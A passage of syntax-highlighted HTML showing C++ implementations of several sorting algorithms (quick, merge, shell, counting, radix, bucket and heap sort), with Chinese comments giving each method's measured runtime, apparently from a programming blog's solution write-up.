class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token 